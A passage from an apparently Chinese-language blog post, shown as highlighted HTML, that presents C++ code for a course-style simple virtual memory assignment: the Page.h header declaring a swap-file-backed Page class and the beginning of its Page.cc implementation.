punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    T<span class=\"token operator\">*</span> address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>T<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>bytes_ <span class=\"token operator\">+</span> virtual_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token operator\">*</span>address <span class=\"token operator\">=</span> to_write<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    dirty_ <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"pageh定义\"><a class=\"markdownIt-Anchor\" href=\"#pageh定义\">#</a>  <code>Page.h</code>  定义</h2>\n<p><code>Page.h</code>  在 <code>simplevm namespace</code>  中。源码如下:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">PAGE_H_</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PAGE_H_</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cstdint></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fstream></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">using</span> std<span class=\"token double-colon punctuation\">::</span>fstream<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">namespace</span> simplevm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">// defines the type pno_t, which is the type</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// that represents a page number</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">uint32_t</span> pno_t<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">///////////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// A Page is a class that represents a page of memory</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// in our simple virtual memory model.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// If a page object exists, then we say that the page is loaded</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// into physical memory. When the page object doesn't exist, then its</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// data is stored in the swap_file. When we load in a page to</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">// \"physical memory\", we are creating the page and we read the page's data</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// from the swap file. A page's data in the swap file starts at</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// virtual_pno * Page::PAGE_SIZE</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">// This Class manages a page's worth of data</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">// Users can access or store data, sa well as flush the data in the</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// page to the specified swap file. A swap file is where exceess virtual</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// memory is stored when it can't fit in physical memory.</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">///////////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Page</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token comment\">// Constructs a new Page object associated</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token comment\">// with a swap_file and a virtual page number.</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token comment\">// The swap file is where we will load in the page</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token comment\">// contents and flush the page contents. The virtual</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">// page number decides where in that file we read</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token comment\">// and write this page.</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token comment\">// Passing in an invalid page number is undefined behaviour</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token comment\">// Note that a Page does not have ownership</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">// of the swap_file_, just access to it.</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token comment\">//  - swap_file the swap_file associated with the page</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token comment\">//  - the virtual page number of our new page</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token function\">Page</span><span class=\"token punctuation\">(</span>fstream<span class=\"token operator\">&amp;</span> swap_file<span class=\"token punctuation\">,</span> pno_t virtual_pno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token comment\">// Constructs a new Page object that is a copy of</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token comment\">// another page object. Both pages will have</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token comment\">// the same page number and swap_file, but should</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token comment\">// have independent copies of the page data.</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token comment\">// Misc: this means that there could be issues with</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token comment\">// having the original and copy page having differnt</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  <span class=\"token comment\">// data. This cctor should only really be used</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token comment\">// in the context of managing pages with something</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token comment\">// like STL, where the original page used for the cctor</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token comment\">// will be discarded. In real C++, we would want to</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token comment\">// use move semantics here.</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  <span class=\"token comment\">// Arguements:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token comment\">//   - other: the page we are copying</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token function\">Page</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Page<span class=\"token operator\">&amp;</span> other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  <span class=\"token comment\">// Destructor for the page object</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  <span class=\"token comment\">// Cleans up any dynamically allocated data or</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  <span class=\"token comment\">// otherwise allocated resources AND should flush</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token comment\">// its contents if the page is dirty at time of</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  <span class=\"token comment\">// destruction.</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>  <span class=\"token operator\">~</span><span class=\"token function\">Page</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token comment\">// Set the current Page object so that is a copy of</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token comment\">// another page object. Both pages will have</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token comment\">// the same page number and swap_file, but should</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token comment\">// have independent copies of the page data.</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>  <span class=\"token comment\">// Misc: this means that there could be issues with</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  <span class=\"token comment\">// having the original and copy page having differnt</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  <span class=\"token comment\">// data. This op= should only really be used</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token comment\">// in the context of managing pages with something</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>  <span class=\"token comment\">// like STL, where the original page used for the cctor</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token comment\">// will be discarded. In real C++, we would want to</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  <span class=\"token comment\">// use move semantics here.</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  <span class=\"token comment\">// You can assume each page has the same swap_file.</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>  <span class=\"token comment\">// Arguements:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>  <span class=\"token comment\">//   - rhs: the page we are copying</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>  Page<span class=\"token operator\">&amp;</span> <span class=\"token keyword\">operator</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Page<span class=\"token operator\">&amp;</span> rhs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>  <span class=\"token comment\">// This function is not required, but you may add it</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>  <span class=\"token comment\">// if it is needed for some of the STL containers</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>  <span class=\"token comment\">// you use in PageTable</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>  <span class=\"token comment\">// Determines if this page should go before another page if they</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>  <span class=\"token comment\">// were in sorted order.</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>  <span class=\"token comment\">//   - rhs: the Page we are comparing this to</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>  <span class=\"token comment\">// Returns: true iff this page would show up before the other</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  <span class=\"token comment\">// page in sorted order. False otherwise.</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>  <span class=\"token keyword\">bool</span> <span class=\"token keyword\">operator</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Page<span class=\"token operator\">&amp;</span> rhs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>  <span class=\"token comment\">// This function allows users to read various data types</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>  <span class=\"token comment\">// from the page. Trying to read a non-primitive type or use</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>  <span class=\"token comment\">// a virtual address that doesn't map to this page results</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token comment\">// in undefined behaviour. You can also assume that</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>  <span class=\"token comment\">// anything being read fits in on the page we are reading</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>  <span class=\"token comment\">// is not partially on another page.</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>  <span class=\"token comment\">// If you are familiar with endianness, it shouldn't be</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  <span class=\"token comment\">// considered for this function.</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  <span class=\"token comment\">//   - virtual_address: a virtual address that maps somewhere</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>  <span class=\"token comment\">//     into the page, where we will read data of type T</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>  <span class=\"token comment\">// Returns:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>  <span class=\"token comment\">//   - the data of type T that was read from the page</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>  <span class=\"token keyword\">template</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">typename</span> <span class=\"token class-name\">T</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>  T <span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> virtual_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>  <span class=\"token comment\">// This function allows users to write various data types</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>  <span class=\"token comment\">// to the page. Trying to write a non-primitive type or use</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>  <span class=\"token comment\">// a virtual address that doesn't map to this page results</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>  <span class=\"token comment\">// in undefined behaviour. You can also assume that</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>  <span class=\"token comment\">// anything being written fits on the current page</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>  <span class=\"token comment\">// is not partially on another page.</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>  <span class=\"token comment\">// If you are familiar with endianness, it shouldn't be</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>  <span class=\"token comment\">// considered for this function.</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>  <span class=\"token comment\">//   - virtual_address: a virtual address that maps somewhere</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>  <span class=\"token comment\">//     into the page, where we will read data of type T</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>  <span class=\"token comment\">//   - to_write: the data of type T to write to the page</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>  <span class=\"token comment\">// Returns: nothing</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>  <span class=\"token keyword\">template</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">typename</span> <span class=\"token class-name\">T</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">store</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> virtual_address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> T<span class=\"token operator\">&amp;</span> to_write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>  <span class=\"token comment\">// Returns the virtual page number of this page</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>  <span class=\"token comment\">// Returns: this page's virtual page number</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>  pno_t <span class=\"token function\">pno</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>  <span class=\"token comment\">// Returns whether or not a page is dirty</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>  <span class=\"token comment\">// A page is \"dirty\" if someone has written to the data managed</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>  <span class=\"token comment\">// by the page since the last time the page was flush()'d.</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>  <span class=\"token comment\">// Returns: Whether this page is dirty or not</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>  <span class=\"token keyword\">bool</span> <span class=\"token function\">dirty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>  <span class=\"token comment\">// Flushes the page to the swap file if it is dirty.</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>  <span class=\"token comment\">// Flushing a page to the swap file involves writing</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>  <span class=\"token comment\">// the page at the the spot correspoding to its page number</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>  <span class=\"token comment\">// in the swap_file. For a description of what it means</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>  <span class=\"token comment\">// for a page to be dirty, see the dirty() member function.</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>  <span class=\"token comment\">// The page should not be written if it is not dirty.</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>  <span class=\"token comment\">// Arguments: None</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>  <span class=\"token comment\">// Returns: Nothing</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>  <span class=\"token comment\">// The amount of memory a page represents</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>  <span class=\"token keyword\">static</span> <span class=\"token keyword\">constexpr</span> size_t PAGE_SIZE <span class=\"token operator\">=</span> <span class=\"token number\">4096U</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre></pre></td></tr><tr><td data-num=\"171\"></td><td><pre> <span class=\"token keyword\">private</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>  <span class=\"token comment\">// The file we will be reading/writing to</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>  <span class=\"token comment\">// Note how this is a reference</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>  <span class=\"token comment\">// also note that a Page does not have ownership</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>  <span class=\"token comment\">// of the swap_file_, just access to it.</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>  fstream<span class=\"token operator\">&amp;</span> swap_file_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>  <span class=\"token comment\">// the virtual page number</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>  pno_t virtual_pno_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>  <span class=\"token comment\">// The bytes of the page. One byte is 8 bits</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>  <span class=\"token comment\">// so we use 8-bit unsigned integers.</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>  <span class=\"token comment\">// You can also assume that a 'char' is one byte big</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>  <span class=\"token keyword\">uint8_t</span> <span class=\"token operator\">*</span>bytes_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>  <span class=\"token comment\">// Whether the page is dirty or not</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>  <span class=\"token keyword\">bool</span> dirty_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre></pre></td></tr><tr><td data-num=\"193\"></td><td><pre><span class=\"token comment\">// since we have template code</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"./PageTemplates.cc\"</span></span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre></pre></td></tr><tr><td data-num=\"196\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span>  <span class=\"token comment\">// PAGE_H_</span></span></pre></td></tr></table></figure><h2 id=\"pagecc实现\"><a class=\"markdownIt-Anchor\" href=\"#pagecc实现\">#</a>  <code>Page.cc</code>  实现</h2>\n<p><code>Page.cc</code>  在 <code>simplevm namespace</code>  中。源码如下:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"./Page.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fstream></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">namespace</span> simplevm <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">// TODO: implement all non template member functions for Page</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// Constructs a new Page object associated</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\">// with a swap_file and a virtual page number.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">// The swap file is where we will load in the page</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// contents and flush the page contents. The virtual</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// page number decides where in that file we read</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">// and write this page.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">// Passing in an invalid page number is undefined behaviour</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// Note that a Page does not have ownership</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// of the swap_file_, just access to it.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token comment\">// Arguments:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token comment\">//  - swap_file the swap_file associated with the page</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\">//  - the virtual page number of our new page</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token class-name\">Page</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">Page</span><span class=\"token punctuation\">(</span>fstream<span class=\"token operator\">&amp;</span> swap_file<span class=\"token punctuation\">,</span> pno_t virtual_pno<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token function\">swap_file_</span><span class=\"token punctuation\">(</span>swap_file<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>virtual_pno_ <span class=\"token operator\">=</span> virtual_pno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>bytes_ <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">uint8_t</span><span class=\"token punctuation\">[</span>PAGE_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// seek the correct position</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    swap_file_<span class=\"token punctuation\">.</span><span class=\"token function\">seekg</span><span class=\"token punctuation\">(</span>virtual_pno_ <span class=\"token operator\">*</span> PAGE_SIZE<span class=\"token punctuation\">,</span> std<span class=\"token double-colon punctuation\">::</span>ios<span class=\"token double-colon punctuation\">::</span>beg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\">// read from the swap file</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    swap_file_<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>bytes_<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>swap_file_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td 